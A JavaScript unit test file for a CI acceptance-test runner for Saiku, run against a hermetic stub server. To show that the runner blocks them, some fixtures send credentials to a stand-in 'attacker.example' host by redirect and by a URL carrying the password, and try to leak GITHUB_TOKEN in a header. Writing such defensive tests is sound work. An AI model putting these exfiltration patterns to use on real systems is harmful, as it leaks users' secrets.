// Unit tests for the acceptance runner (ported from spiculedata/saiku-cloud#1382, adapted
// to Saiku's session / basic auth and /rest/saiku/api base path). Hermetic: a loopback HTTP
// server that behaves like Saiku (login at /rest/saiku/session, JSESSIONID + XSRF-TOKEN
// cookies, CSRF on non-safe methods) and a temp directory, no network. Run by
// `ci / flake-policy tests` (node --test ".github/scripts/*.test.mjs").

import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';

import {
  attachResults,
  createSession,
  resolveUrl,
  runApiSpec,
  runSpecs,
  runUiSpec,
  specIssues,
  summariseResults
} from './acceptance-runner.mjs';
import { validateSpec } from './acceptance-spec.mjs';
import { SCHEMA_VERSION } from './ci-feedback.mjs';

const repoRoot = join(import.meta.dirname, '..', '..');
const runner = join(repoRoot, '.github', 'scripts', 'acceptance-runner.mjs');

const USER = 'acceptance';
const PASSWORD = 'correct horse';
const SESSION = 'JSESSIONID=sess-1';
const XSRF = 'tok-xsrf-1';

/** A stub that behaves like Saiku: anonymous /info, form login, cookies, CSRF on writes, a limiter. */
function stubServer() {
  const calls = [];
  const server = createServer((req, res) => {
    let body = '';
    req.on('data', (c) => {
      body += c;
    });
    req.on('end', () => {
      calls.push({ method: req.method, url: req.url, headers: req.headers, body });
      const json = (code, value, headers = {}) => {
        res.writeHead(code, { 'content-type': 'application/json', ...headers });
        res.end(JSON.stringify(value));
      };
      const hasSession = (req.headers.cookie ?? '').includes(SESSION);
      const basic = req.headers.authorization === `Basic ${Buffer.from(`${USER}:${PASSWORD}`).toString('base64')}`;
      const authed = hasSession || basic;

      if (req.url === '/rest/saiku/info') return json(200, []);
      if (req.url === '/rest/saiku/session' && req.method === 'POST') {
        const form = new URLSearchParams(body);
        if (form.get('username') === USER && form.get('password') === PASSWORD) {
          res.writeHead(200, { 'set-cookie': [`${SESSION}; Path=/; HttpOnly`, `XSRF-TOKEN=${XSRF}; Path=/`] });
          return res.end();
        }
        return json(401, { error: 'Authentication failed' });
      }
      if (req.url === '/rest/saiku/api/ai/cubes') {
        return authed ? json(200, [{ connectionName: 'foodmart', cubeName: 'Sales' }]) : json(401, { error: 'unauthorized' });
      }
      if (req.url === '/rest/saiku/api/ai/write' && req.method === 'POST') {
        // CSRF: session callers must echo the XSRF-TOKEN cookie; basic callers are exempt.
        if (hasSession && req.headers['x-xsrf-token'] !== XSRF) return json(403, { error: 'csrf' });
        return authed ? json(200, { ok: true }) : json(401, { error: 'unauthorized' });
      }
      if (req.url === '/rest/saiku/api/limiter/probe') {
        return json(429, { error: 'rate_limited' }, { 'retry-after': '30' });
      }
      if (req.url === '/rest/saiku/api/boom') return json(500, { error: 'DATE boundary type' });
      if (req.url === '/rest/saiku/api/redirect') {
        res.writeHead(302, { location: 'https://attacker.example/steal' });
        return res.end();
      }
      return json(404, { error: 'no route' });
    });
  });
  return new Promise((resolveReady) => {
    server.listen(0, '127.0.0.1', () => {
      resolveReady({
        url: `http://127.0.0.1:${server.address().port}`,
        calls,
        close: () => new Promise((r) => server.close(r))
      });
    });
  });
}

const CREDENTIALS = { SAIKU_ACCEPTANCE_USER: USER, SAIKU_ACCEPTANCE_PASSWORD: PASSWORD };

/**
 * A stub base URL in its OWN process. `spawnSync` blocks this process's event
 * loop, so a server in the same process could not answer the CLI under test.
 * It binds port 0 and reports the port, so a busy machine never collides.
 */
async function stubServerProcess() {
  const dir = mkdtempSync(join(tmpdir(), 'acceptance-stub-'));
  const file = join(dir, 'server.mjs');
  writeFileSync(
    file,
    [
      "import { createServer } from 'node:http';",
      "const server = createServer((req, res) => {",
      "  res.writeHead(429, { 'content-type': 'application/json', 'retry-after': '30' });",
      "  res.end(JSON.stringify({ error: 'rate_limited' }));",
      '});',
      "server.listen(0, '127.0.0.1', () => console.log(`ready ${server.address().port}`));"
    ].join('\n')
  );
  const child = spawn(process.execPath, [file], { stdio: ['ignore', 'pipe', 'pipe'] });
  const port = await new Promise((resolvePort, reject) => {
    let out = '';
    child.stdout.on('data', (chunk) => {
      out += chunk;
      const match = /ready (\d+)/.exec(out);
      if (match) resolvePort(Number(match[1]));
    });
    child.on('error', reject);
    child.on('exit', () => reject(new Error('stub base URL exited before it was ready')));
  });
  return { url: `http://127.0.0.1:${port}`, stop: () => child.kill('SIGKILL') };
}

function repo(specs) {
  const root = mkdtempSync(join(tmpdir(), 'acceptance-run-'));
  for (const [issue, spec] of Object.entries(specs)) {
    mkdirSync(join(root, 'acceptance', String(issue)), { recursive: true });
    writeFileSync(join(root, 'acceptance', String(issue), 'spec.json'), JSON.stringify(spec, null, 2));
  }
  return root;
}

/** The subset of JSON Schema used by .github/ci-feedback.schema.json. */
function validate(schema, value, path = '$') {
  const errors = [];
  if (schema.type !== undefined) {
    const types = Array.isArray(schema.type) ? schema.type : [schema.type];
    const actual =
      value === null ? 'null' : Array.isArray(value) ? 'array' : typeof value === 'number' && Number.isInteger(value) ? 'integer' : typeof value;
    if (!types.includes(actual) && !(actual === 'integer' && types.includes('number'))) errors.push(`${path}: ${actual} not ${types.join('|')}`);
  }
  if (schema.const !== undefined && value !== schema.const) errors.push(`${path}: not const`);
  if (schema.enum && !schema.enum.includes(value)) errors.push(`${path}: ${value} not in enum`);
  if (value && typeof value === 'object' && !Array.isArray(value)) {
    for (const key of schema.required ?? []) if (!Object.hasOwn(value, key)) errors.push(`${path}: missing "${key}"`);
    for (const [key, child] of Object.entries(value)) {
      if (!schema.properties || !schema.properties[key]) errors.push(`${path}: undeclared "${key}"`);
      else errors.push(...validate(schema.properties[key], child, `${path}.${key}`));
    }
  }
  if (Array.isArray(value) && schema.items) {
    value.forEach((item, i) => errors.push(...validate(schema.items, item, `${path}[${i}]`)));
  }
  return errors;
}

const schema = JSON.parse(readFileSync(join(repoRoot, '.github', 'ci-feedback.schema.json'), 'utf8'));

const cubesSpec = {
  issue: 818,
  title: 'the cube list is served to a logged-in user and refused to an anonymous one',
  kind: 'api',
  auth: 'session',
  criteria: [
    { id: 'C1', given: 'a logged-in user', then: 'the cube list names FoodMart Sales' },
    { id: 'C2', given: 'an anonymous caller', then: 'the request is refused with 401' }
  ],
  steps: [
    {
      name: 'the cube list names Sales',
      criterion: 'C1',
      request: { method: 'GET', path: '/ai/cubes' },
      expect: { status: 200, json: { $: { type: 'array' }, '[0].cubeName': { equals: 'Sales' } } }
    },
    {
      name: 'an anonymous caller is refused',
      criterion: 'C2',
      auth: 'none',
      request: { method: 'GET', path: '/ai/cubes' },
      expect: { status: 401 }
    }
  ]
};

const infoSpec = {
  issue: 866,
  title: 'info answers anonymously',
  kind: 'api',
  criteria: [{ id: 'C1', then: 'GET /rest/saiku/info is an anonymous JSON array' }],
  steps: [
    {
      name: 'info is an array',
      criterion: 'C1',
      request: { method: 'GET', path: '/rest/saiku/info' },
      expect: { status: 200, json: { $: { type: 'array' } } }
    }
  ]
};

const limiterSpec = {
  issue: 1361,
  title: 'the rate limiter answers 429 once the budget is spent',
  kind: 'api',
  criteria: [{ id: 'C1', given: 'a caller over the quota', then: 'the response is 429 with a Retry-After header' }],
  steps: [
    {
      name: 'the 61st request in the window is refused',
      criterion: 'C1',
      request: { method: 'GET', path: '/limiter/probe' },
      expect: {
        status: 429,
        header: { name: 'Retry-After', type: 'string' },
        bodyContains: 'rate_limited'
      }
    }
  ]
};

// -------------------------------------------------------------- the two examples

test('the worked examples pass against a base URL that behaves like Saiku', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const root = repo({ 818: cubesSpec, 866: infoSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url, env: CREDENTIALS });

  assert.equal(results.verdict, 'pass', JSON.stringify(results, null, 2));
  assert.deepEqual(results.specs.map((s) => s.issue), [818, 866]);
  // exactly one login for the whole spec, with the credentials from the environment
  const logins = stub.calls.filter((c) => c.url === '/rest/saiku/session');
  assert.equal(logins.length, 1);
  assert.equal(new URLSearchParams(logins[0].body).get('username'), USER);
  // relative paths resolve under /rest/saiku/api, the session cookie rides along, the anonymous step carries none
  const cubeCalls = stub.calls.filter((c) => c.url === '/rest/saiku/api/ai/cubes');
  assert.equal(cubeCalls.length, 2);
  assert.match(cubeCalls[0].headers.cookie, /JSESSIONID=sess-1/);
  assert.equal(cubeCalls[1].headers.cookie, undefined);
  // a /rest/ path is used as-is
  assert.ok(stub.calls.some((c) => c.url === '/rest/saiku/info'));
});

test('session auth: non-safe requests echo the XSRF-TOKEN cookie; basic auth needs no token', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const write = (auth) => ({
    issue: 5,
    title: 'write',
    kind: 'api',
    auth,
    criteria: [{ id: 'C1', then: 'the write is accepted' }],
    steps: [{ name: 'post', criterion: 'C1', request: { method: 'POST', path: '/ai/write', json: { a: 1 } }, expect: { status: 200 } }]
  });
  const session = await runSpecs({ repoRoot: repo({ 5: write('session') }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(session.verdict, 'pass', JSON.stringify(session.specs));
  const post = stub.calls.filter((c) => c.url === '/rest/saiku/api/ai/write').at(-1);
  assert.equal(post.headers['x-xsrf-token'], XSRF);
  assert.equal(post.headers['content-type'], 'application/json');

  const basic = await runSpecs({ repoRoot: repo({ 5: write('basic') }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(basic.verdict, 'pass', JSON.stringify(basic.specs));
  const basicPost = stub.calls.filter((c) => c.url === '/rest/saiku/api/ai/write').at(-1);
  assert.match(basicPost.headers.authorization, /^Basic /);
  assert.equal(basicPost.headers.cookie, undefined);
  assert.equal(stub.calls.filter((c) => c.url === '/rest/saiku/session').length, 1, 'basic never logs in');
});

test('a spec that needs credentials the environment lacks is not-run, never a pass or a product failure', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  for (const auth of ['session', 'basic']) {
    const results = await runSpecs({ repoRoot: repo({ 818: { ...cubesSpec, auth } }), baseUrl: stub.url, env: {} });
    assert.equal(results.verdict, 'not-run');
    assert.match(results.specs[0].reason, /credentials not configured/);
  }
  assert.equal(stub.calls.length, 0, 'nothing is sent without credentials');
});

test('a refused login fails the spec loudly, once, without hammering the login endpoint', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const results = await runSpecs({
    repoRoot: repo({ 818: cubesSpec }),
    baseUrl: stub.url,
    env: { SAIKU_ACCEPTANCE_USER: USER, SAIKU_ACCEPTANCE_PASSWORD: 'wrong' }
  });
  assert.equal(results.verdict, 'fail');
  assert.match(results.specs[0].checks[0].failures[0].detail, /login to .* was refused: HTTP 401/);
  assert.equal(stub.calls.filter((c) => c.url === '/rest/saiku/session').length, 1);
  assert.doesNotMatch(JSON.stringify(results), /wrong|correct horse/, 'a password never reaches the results');
});

test('the runner reports the failing assertion, not just a red build', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const broken = { ...cubesSpec, steps: [{ ...cubesSpec.steps[0], expect: { status: 200, json: { '[0].cubeName': { equals: 'HR' } } } }, cubesSpec.steps[1]] };
  const results = await runSpecs({ repoRoot: repo({ 818: broken }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(results.verdict, 'fail');
  const [spec] = results.specs;
  assert.equal(spec.checks[0].verdict, 'fail');
  assert.match(spec.checks[0].failures[0].detail, /expected "HR", got "Sales"|expected HR, got Sales/);
  assert.equal(spec.checks[1].verdict, 'pass', 'a passing step is still reported');
});

test('a 500 from the endpoint under test fails the spec', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const root = repo({
    7: {
      issue: 7,
      title: 'no 500',
      kind: 'api',
      criteria: [{ id: 'C1', then: 'it does not 500' }],
      steps: [{ name: 'call it', criterion: 'C1', request: { method: 'GET', path: '/boom' }, expect: { status: 200 } }]
    }
  });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  assert.equal(results.verdict, 'fail');
  assert.match(results.specs[0].checks[0].failures[0].detail, /expected 200, got 500/);
});

test('repeat drives a request until the status is reached (the limiter contract)', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const spec = { ...limiterSpec, steps: [{ ...limiterSpec.steps[0], repeat: { count: 5, untilStatus: 429 } }] };
  const results = await runSpecs({ repoRoot: repo({ 1361: spec }), baseUrl: stub.url });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs));
  assert.equal(stub.calls.length, 1, 'stopped at the first 429');
});

test('redirects are never followed, so credentials cannot be carried to another host', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const spec = {
    issue: 6,
    title: 'redirect',
    kind: 'api',
    auth: 'session',
    criteria: [{ id: 'C1', then: 'the redirect is visible as a 302' }],
    steps: [{ name: 'redirect', criterion: 'C1', request: { method: 'GET', path: '/redirect' }, expect: { status: 302 } }]
  };
  const results = await runSpecs({ repoRoot: repo({ 6: spec }), baseUrl: stub.url, env: CREDENTIALS });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs));
});

test('createSession refuses a request outside its origin and resolveUrl keeps paths on the base', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const session = createSession({ baseUrl: stub.url, env: CREDENTIALS });
  await assert.rejects(session.request('https://attacker.example/x', { method: 'GET' }, 'session'), /outside/);
  assert.equal(stub.calls.length, 0, 'no login was attempted for a foreign origin');

  assert.equal(resolveUrl(stub.url, '/ai/cubes'), `${stub.url}/rest/saiku/api/ai/cubes`);
  assert.equal(resolveUrl(stub.url, '/rest/saiku/info'), `${stub.url}/rest/saiku/info`);
  assert.equal(resolveUrl(stub.url, '/ai/cubes', '/custom/'), `${stub.url}/custom/ai/cubes`);
  assert.throws(() => resolveUrl(stub.url, '//attacker.example/x'), /must not start with/);
  assert.throws(() => resolveUrl(stub.url, 'ai/cubes'), /must start with/);
  assert.throws(() => resolveUrl(stub.url, 'https://attacker.example/x'), /different origin/);
});

test('a base URL that is not there is not-run, never pass', async () => {
  const root = repo({ 866: infoSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: 'http://127.0.0.1:1' });
  assert.equal(results.verdict, 'fail', 'the spec ran and the request failed');
  assert.match(results.specs[0].checks[0].failures[0].detail, /ECONNREFUSED|fetch failed/);

  const noUrl = await runSpecs({ repoRoot: root });
  assert.equal(noUrl.verdict, 'not-run');
  assert.equal(noUrl.specs[0].reason, 'no base URL configured');
});

test('an invalid spec is not-run with a reason, and the directory is named', async () => {
  const root = repo({ 9: { issue: 9, kind: 'api' } });
  const results = await runSpecs({ repoRoot: root, baseUrl: 'http://127.0.0.1:1' });
  assert.equal(results.verdict, 'not-run');
  assert.match(results.specs[0].reason, /invalid spec/);
});

test('a ui spec runs its argv in its own directory with the base URL in the environment', async (t) => {
  const root = repo({
    11: {
      issue: 11,
      title: 'the page shows the contract notice',
      kind: 'ui',
      criteria: [{ id: 'C1', then: 'the notice is visible' }],
      command: ['node', 'check.mjs']
    }
  });
  writeFileSync(
    join(root, 'acceptance', '11', 'check.mjs'),
    [
      "import { writeFileSync } from 'node:fs';",
      "writeFileSync('seen.txt', process.env.SAIKU_BASE_URL ?? 'none');",
      "process.exit(process.env.SAIKU_BASE_URL ? 0 : 1);"
    ].join('\n')
  );
  const results = await runSpecs({ repoRoot: root, baseUrl: 'https://acceptance.example' });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs[0], null, 2));
  assert.equal(readFileSync(join(root, 'acceptance', '11', 'seen.txt'), 'utf8'), 'https://acceptance.example');

  const failing = repo({
    12: { issue: 12, title: 'x', kind: 'ui', criteria: [{ id: 'C1', then: 'y' }], command: ['node', '-e', 'process.exit(3)'] }
  });
  const failed = await runSpecs({ repoRoot: failing, baseUrl: 'https://example.invalid' });
  assert.equal(failed.verdict, 'fail');
  assert.match(failed.specs[0].checks[0].failures[0].detail, /exited 3/);
});

test('a command spec runs without a base URL; an api spec does not', async () => {
  const root = repo({
    13: {
      issue: 13,
      title: 'cli only',
      kind: 'ui',
      criteria: [{ id: 'C1', then: 'the CLI agrees' }],
      command: ['node', '-e', 'process.exit(0)']
    },
    14: {
      issue: 14,
      title: 'needs a host',
      kind: 'api',
      criteria: [{ id: 'C1', then: 'x' }],
      steps: [{ name: 's', criterion: 'C1', request: { method: 'GET', path: '/healthz' }, expect: { status: 200 } }]
    }
  });
  const results = await runSpecs({ repoRoot: root });
  assert.equal(results.specs.find((s) => s.issue === 13).verdict, 'pass');
  assert.equal(results.specs.find((s) => s.issue === 14).verdict, 'not-run');
  assert.equal(results.verdict, 'pass', 'one spec ran green and one could not run at all');
});

// ------------------------------------------------------- ci-feedback.json

test('attachResults folds the run into a schema-valid ci-feedback.json', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const failing = { ...infoSpec, issue: 1359, steps: [{ ...infoSpec.steps[0], name: 'info is an object', expect: { status: 200, json: { $: { type: 'object' } } } }] };
  const root = repo({ 1361: limiterSpec, 1359: failing });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url, env: {} });
  assert.equal(results.verdict, 'fail');

  const doc = attachResults(null, results, {
    repo: 'spiculedata/saiku',
    sha: 'a'.repeat(40),
    branch: 'feature/ci-feedback-acceptance',
    pr: 1425,
    runUrl: 'https://github.com/spiculedata/saiku/actions/runs/1'
  });

  assert.deepEqual(validate(schema, doc), []);
  assert.equal(doc.schemaVersion, SCHEMA_VERSION, 'an added optional field is not a version bump');
  assert.equal(doc.status, 'failed');
  assert.equal(doc.acceptance.verdict, 'fail');
  assert.deepEqual(doc.acceptance.specs.find((s) => s.issue === 1359).failedChecks, ['info is an object']);
  assert.deepEqual(doc.failingTestIds, ['acceptance/1359']);
  assert.match(doc.reproCommand, /acceptance-runner\.mjs run --dir acceptance\/1359 --base-url http:\/\/127/);
  assert.match(doc.failures[0].firstError.excerpt, /expected type object, got array/);
});

test('attachResults keeps a document it is given and never makes a pass look like a failure', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const existing = {
    schemaVersion: 1,
    generatedAt: '2026-10-04T00:00:00.000Z',
    status: 'passed',
    repository: 'spiculedata/saiku',
    commit: { sha: 'b'.repeat(40), branch: 'feature/x' },
    pullRequest: { number: 7 },
    runs: [{ id: 1, name: 'ci', status: 'completed', conclusion: 'success', url: 'https://example.invalid' }],
    pendingRuns: [],
    failingChecks: [],
    failures: [],
    omittedFailures: 0,
    failingTestIds: [],
    reproCommand: null,
    artifacts: [],
    evidenceArtifacts: [],
    previewUrl: null,
    feedbackUrl: null,
    filteredNoise: []
  };
  const root = repo({ 1361: limiterSpec });
  const pass = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  const doc = attachResults(existing, pass, { repo: 'spiculedata/saiku', pr: 7 });
  assert.deepEqual(validate(schema, doc), []);
  assert.equal(doc.status, 'passed');
  assert.equal(doc.acceptance.verdict, 'pass');
  assert.equal(doc.generatedAt, existing.generatedAt, 'the rest of the document is untouched');
  assert.deepEqual(doc.runs, existing.runs);
});

test('summariseResults keeps the document small', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const root = repo({ 1361: limiterSpec });
  const summary = summariseResults(await runSpecs({ repoRoot: root, baseUrl: stub.url }));
  assert.deepEqual(Object.keys(summary).sort(), ['baseUrl', 'generatedAt', 'specs', 'verdict']);
  assert.deepEqual(Object.keys(summary.specs[0]).sort(), ['issue', 'kind', 'verdict']);
});

// ---------------------------------------------------------------- the CLI

test('the runner CLI writes results and exits non-zero only on a real failure', async (t) => {
  const stub = await stubServerProcess();
  t.after(() => stub.stop());
  const root = repo({ 1361: limiterSpec });
  const out = join(root, 'results.json');

  const pass = spawnSync(
    process.execPath,
    [runner, 'run', '--repo-root', root, '--base-url', stub.url, '--all', '--out', out, '--feedback', out],
    { encoding: 'utf8', cwd: repoRoot }
  );
  assert.equal(pass.status, 0, pass.stdout + pass.stderr);
  assert.match(pass.stdout, /acceptance\/1361: pass/);
  const doc = JSON.parse(readFileSync(out, 'utf8'));
  assert.deepEqual(validate(schema, doc), []);
  assert.equal(doc.acceptance.verdict, 'pass');

  const broken = repo({
    1361: { ...limiterSpec, steps: [{ ...limiterSpec.steps[0], expect: { status: 200 } }] }
  });
  const fail = spawnSync(
    process.execPath,
    [runner, 'run', '--repo-root', broken, '--base-url', stub.url, '--all'],
    { encoding: 'utf8', cwd: repoRoot }
  );
  assert.equal(fail.status, 1);
  assert.match(fail.stdout, /x the 61st request in the window is refused/);

  assert.equal(
    spawnSync(process.execPath, [runner, 'run', '--base-url', 'nope'], { encoding: 'utf8' }).status,
    2,
    'a base URL that is not http(s) is bad input, not a test failure'
  );
});

test('the shipped specs of this repository satisfy their own format', () => {
  // Every PR that adds a spec grows this list, so assert the worked examples are
  // discovered (and the list is sorted) rather than pinning the exact set.
  const issues = specIssues(repoRoot);
  for (const issue of [818, 866, 2172]) assert.ok(issues.includes(issue), `acceptance/${issue} is discovered`);
  assert.deepEqual(issues, [...issues].sort((a, b) => a - b));
  for (const issue of specIssues(repoRoot)) {
    const spec = JSON.parse(readFileSync(join(repoRoot, 'acceptance', String(issue), 'spec.json'), 'utf8'));
    assert.deepEqual(validateSpec(spec), [], `acceptance/${issue}`);
  }
});

// The CLI's other subcommand, and its bad-input behaviour: an unreadable
// results file is exit 2 with a message, never a stack trace.
test('the runner script is shipped with a usable CLI', () => {
  const bad = spawnSync(
    process.execPath,
    [runner, 'attach', '--results', '/nonexistent.json', '--feedback', '/nonexistent.json'],
    { encoding: 'utf8', cwd: repoRoot }
  );
  assert.equal(bad.status, 2);
  assert.match(bad.stderr, /is not an acceptance results document/);

  const dir = mkdtempSync(join(tmpdir(), 'acceptance-attach-'));
  const results = join(dir, 'results.json');
  const feedback = join(dir, 'ci-feedback.json');
  writeFileSync(results, JSON.stringify({ schemaVersion: 1, generatedAt: 'now', baseUrl: null, verdict: 'not-run', specs: [] }));
  const good = spawnSync(
    process.execPath,
    [runner, 'attach', '--results', results, '--feedback', feedback],
    { encoding: 'utf8', cwd: repoRoot }
  );
  assert.equal(good.status, 0, good.stderr);
  assert.match(good.stdout, /now carries acceptance verdict "not-run"/);
  assert.deepEqual(validate(schema, JSON.parse(readFileSync(feedback, 'utf8'))), []);
});

// ---------------------------------------------------- spec commands get a clean env

test('a ui spec command does not inherit the runner environment', async () => {
  const keep = { GITHUB_TOKEN: process.env.GITHUB_TOKEN, SOME_SECRET: process.env.SOME_SECRET, ACCEPTANCE_API_KEY_TEST: process.env.ACCEPTANCE_API_KEY_TEST };
  process.env.GITHUB_TOKEN = 'ghs_fake';
  process.env.SOME_SECRET = 'hunter2';
  try {
    const dir = mkdtempSync(join(tmpdir(), 'acc-env-'));
    const [result] = runUiSpec(
      { title: 'env', command: ['node', '-e', 'process.exit(process.env.GITHUB_TOKEN || process.env.SOME_SECRET ? 1 : 0)'] },
      { baseUrl: '', dir }
    );
    assert.equal(result.verdict, 'pass');
  } finally {
    for (const [k, v] of Object.entries(keep)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
});

test('a ui spec command still gets PATH, the base url and the acceptance variables', async () => {
  process.env.SAIKU_ACCEPTANCE_PASSWORD = 'k-test';
  try {
    const dir = mkdtempSync(join(tmpdir(), 'acc-env-'));
    const [result] = runUiSpec(
      {
        title: 'env',
        command: [
          'node',
          '-e',
          'process.exit(process.env.ACCEPTANCE_BASE_URL === "https://acceptance.example" && process.env.SAIKU_BASE_URL === "https://acceptance.example" && process.env.SAIKU_ACCEPTANCE_PASSWORD === "k-test" && process.env.PATH ? 0 : 1)'
        ]
      },
      { baseUrl: 'https://acceptance.example', dir }
    );
    assert.equal(result.verdict, 'pass');
  } finally {
    delete process.env.SAIKU_ACCEPTANCE_PASSWORD;
  }
});

// ------------------------------------------------------- saiku-cloud#1428 origin restriction

test('an absolute URL on the same origin is allowed (origin restriction)', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const absSpec = {
    issue: 9900,
    title: 'absolute same-origin path',
    kind: 'api',
    criteria: [{ id: 'C1', then: 'passes' }],
    steps: [
      {
        name: 'hit freshness via absolute URL',
        criterion: 'C1',
        request: { method: 'GET', path: `${stub.url}/rest/saiku/api/ai/cubes` },
        expect: { status: 401 }
      }
    ]
  };
  const root = repo({ 9900: absSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  assert.equal(results.verdict, 'pass', JSON.stringify(results.specs[0], null, 2));
});

test('an absolute URL to a different origin is rejected (origin restriction)', async (t) => {
  const stub = await stubServer();
  t.after(() => stub.close());
  const exfilSpec = {
    issue: 9901,
    title: 'cross-origin absolute path',
    kind: 'api',
    criteria: [{ id: 'C1', then: 'blocked' }],
    steps: [
      {
        name: 'try to exfiltrate to attacker server',
        criterion: 'C1',
        request: { method: 'GET', path: 'https://attacker.example/steal?secret={{env.SAIKU_ACCEPTANCE_PASSWORD}}' },
        expect: { status: 200 }
      }
    ]
  };
  const root = repo({ 9901: exfilSpec });
  const results = await runSpecs({ repoRoot: root, baseUrl: stub.url });
  assert.equal(results.specs[0].checks[0].verdict, 'fail');
  assert.match(
    results.specs[0].checks[0].failures[0].detail,
    /different origin|not allowed/,
  );
});

test('an api spec does not receive GITHUB_TOKEN via env (defense in depth)', async (t) => {
  // runSpecs now passes specEnv(env, baseUrl) rather than raw env to runApiSpec.
  // This verifies that non-allowlisted vars are stripped before interpolation.
  const stub = await stubServer();
  t.after(() => stub.close());
  // Temporarily inject a fake token into the env we pass in.
  const tokenSpec = {
    issue: 9902,
    title: 'GITHUB_TOKEN must not reach the api spec env',
    kind: 'api',
    criteria: [{ id: 'C1', then: 'the request goes to the api without the token in headers' }],
    steps: [
      {
        name: 'GET freshness',
        criterion: 'C1',
        request: {
          method: 'GET',
          path: '/ai/cubes',
          headers: { 'x-leaked-token': '{{env.GITHUB_TOKEN}}' }
        },
        expect: { status: 401 }
      }
    ]
  };
  const root = repo({ 9902: tokenSpec });
  const results = await runSpecs({
    repoRoot: root,
    baseUrl: stub.url,
    env: { GITHUB_TOKEN: 'ghs_should_not_appear' }
  });
  // The step runs (401 from stub) but the token must not have been interpolated.
  const sentHeader = stub.calls.find((c) => c.url === '/rest/saiku/api/ai/cubes')?.headers['x-leaked-token'];
  // specEnv strips GITHUB_TOKEN → {{env.GITHUB_TOKEN}} is left as a literal or resolves to ''
  assert.ok(
    sentHeader === undefined || sentHeader === '' || sentHeader === '{{env.GITHUB_TOKEN}}',
    `GITHUB_TOKEN must not reach the spec environment, got: ${sentHeader}`,
  );
});

// ------------------------------------------------------- workflow trust guards

test('acceptance.yml stays on pull_request; credentials come from secrets (default: the public demo login), never variables', async () => {
  const text = readFileSync(join(repoRoot, '.github', 'workflows', 'acceptance.yml'), 'utf8');
  const code = text.split('\n').filter((l) => !l.trim().startsWith('#')).join('\n');
  assert.match(code, /^on:\n {2}pull_request:/m, 'acceptance.yml must trigger on pull_request');
  assert.doesNotMatch(code, /pull_request_target/);
  assert.doesNotMatch(code, /workflow_run/, 'a workflow_run copy would run PR specs with default-branch secrets');
  // a credential is never a repository variable: variables are unmasked in logs
  assert.doesNotMatch(code, /vars\.SAIKU_ACCEPTANCE_(USER|PASSWORD|API_KEY|TOKEN|SECRET)/);
  // secrets stay the only override; the fallback is the PUBLIC demo login and nothing else, so a
  // private target's real credential can never be hard-coded here by accident
  assert.match(code, /secrets\.SAIKU_ACCEPTANCE_USER \|\| 'admin'/);
  assert.match(code, /secrets\.SAIKU_ACCEPTANCE_PASSWORD \|\| 'admin'/);
  assert.match(code, /vars\.ACCEPTANCE_BASE_URL/);
  // no write scopes, no checkout of anything but the default merge ref, no token handed to the specs
  assert.match(code, /permissions:\n {2}contents: read\n/);
  assert.doesNotMatch(code, /(?:contents|issues|pull-requests|actions|checks|statuses|id-token): write/);
  assert.doesNotMatch(code, /GITHUB_TOKEN|github\.token/);
});
